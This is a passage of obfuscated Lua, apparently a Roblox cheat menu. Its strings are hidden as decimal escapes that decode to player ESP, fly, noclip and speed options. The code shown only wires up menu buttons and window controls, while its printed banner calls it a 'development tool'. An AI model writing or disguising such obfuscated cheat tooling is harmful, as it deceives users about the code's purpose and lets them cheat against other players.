L_104_()

local function L_140_(L_141_arg0, L_142_arg0, L_143_arg0)
    for L_144_, L_145_ in ipairs(L_143_arg0) do
        if L_145_.button then
            L_145_.button.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
            L_145_.selected = false
        end
    end
    
    L_141_arg0.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    L_142_arg0.selected = true
    
    L_40_.Text = L_141_arg0.Text:gsub("^%s+", "")
    
    if L_142_arg0.name == "\080\108\097\121\101\114\069\083\080" then
        L_70_()
    elseif L_142_arg0.name == "\070\108\121" then
        L_82_()
    elseif L_142_arg0.name == "\078\111\099\108\105\112" then
        L_93_()
    elseif L_142_arg0.name == "\083\112\101\101\100" then
        L_104_()
    elseif L_142_arg0.name == "\067\108\101\097\114\087\097\116\101\114" or L_142_arg0.name == "\081\105\110\103\070\101\110\103" then
        L_117_()
    else
        L_44_:ClearAllChildren()
        local L_146_ = Instance.new("\084\101\120\116\076\097\098\101\108")
        L_146_.Size = UDim2.new(1, 0, 0, 100)
        L_146_.Position = UDim2.new(0, 0, 0.4, 0)
        L_146_.BackgroundTransparency = 1
        L_146_.Text = L_141_arg0.Text:gsub("^%s+", "") .. "\032\102\117\110\099\116\105\111\110\010\040\102\117\110\099\116\105\111\110\032\100\101\118\101\108\111\112\109\101\110\116\032\105\110\041"
        L_146_.TextColor3 = Color3.fromRGB(150, 150, 150)
        L_146_.TextSize = 18
        L_146_.TextWrapped = true
        L_146_.Parent = L_44_
    end
end

for L_147_, L_148_ in ipairs(L_31_) do
    if L_148_.button then
        L_148_.button.MouseButton1Click:Connect(function()
            L_140_(L_148_.button, L_148_, L_31_)
        end)
    end
end

for L_149_, L_150_ in ipairs(L_33_) do
    if L_150_.button then
        L_150_.button.MouseButton1Click:Connect(function()
            L_140_(L_150_.button, L_150_, L_33_)
        end)
    end
end

for L_151_, L_152_ in ipairs(L_35_) do
    if L_152_.button then
        L_152_.button.MouseButton1Click:Connect(function()
            L_140_(L_152_.button, L_152_, L_35_)
        end)
    end
end

for L_153_, L_154_ in ipairs(L_37_) do
    if L_154_.button then
        L_154_.button.MouseButton1Click:Connect(function()
            L_140_(L_154_.button, L_154_, L_37_)
        end)
    end
end

L_31_[4].button.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
L_31_[4].selected = true

local L_155_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
L_155_.Name = "\077\105\110\105\109\105\122\101\100\087\105\110\100\111\119"
L_155_.Size = UDim2.new(0, 80, 0, 80)
L_155_.Position = UDim2.new(0, 20, 0.5, -40)
L_155_.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
L_155_.BorderSizePixel = 0
L_155_.Text = "\071\085\073"
L_155_.TextColor3 = Color3.fromRGB(212, 212, 212)
L_155_.TextSize = 14
L_155_.Visible = false
L_155_.Parent = L_9_

local L_156_ = Instance.new("\085\073\067\111\114\110\101\114")
L_156_.CornerRadius = UDim.new(0.2, 0)
L_156_.Parent = L_155_

local L_157_ = false

L_42_.MouseButton1Click:Connect(function()
    if not L_157_ then
        L_157_ = true
        L_10_.Visible = false
        L_155_.Visible = true
    else
        L_157_ = false
        L_155_.Visible = false
        L_10_.Visible = true
    end
end)

L_155_.MouseButton1Click:Connect(function()
    L_157_ = false
    L_155_.Visible = false
    L_10_.Visible = true
end)

L_43_.MouseButton1Click:Connect(function()
    L_9_:Destroy()
end)

L_42_.MouseEnter:Connect(function()
    L_42_.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
end)

L_42_.MouseLeave:Connect(function()
    L_42_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
end)

L_43_.MouseEnter:Connect(function()
    L_43_.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
end)

L_43_.MouseLeave:Connect(function()
    L_43_.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
end)

L_155_.MouseEnter:Connect(function()
    L_155_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
end)

L_155_.MouseLeave:Connect(function()
    L_155_.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
end)

print("\082\111\098\108\111\120\032\083\116\117\100\105\111\032\100\101\118\101\108\111\112\109\101\110\116\032\116\111\111\108\032\071\085\073\032\104\097\115\032\098\101\101\110\032\108\111\097\100\101\100\033")
print("\070\117\110\099\116\105\111\110\115\058\032\112\108\097\121\101\114\032\069\083\080\044\032\102\108\121\105\110\103\044\032\110\111\099\108\105\112\044\032\109\111\100\105\102\121\032\115\112\101\101\100\044\032\071\066\032\115\099\114\105\112\116\115")
